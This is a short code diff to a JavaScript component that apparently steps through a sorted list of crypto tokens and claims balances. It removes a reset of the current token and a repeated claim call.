@@ -487,6 +487,7 @@ export default {
 
           this.processing = false;
           this.isDone = true;
+
           if (this.currentIndex + 1 > this.sortedTokens.length) {
             if (this.claimable > 0) {
               await claim(this.balance.value);
@@ -499,9 +500,7 @@ export default {
             }
           } else {
             this.currentIndex += 1;
-            this.maxToken = null;
             this.maxToken = this.sortedTokens[this.currentIndex];
-            this.wc_claim();
           }
         } else {
           this.wConnect();
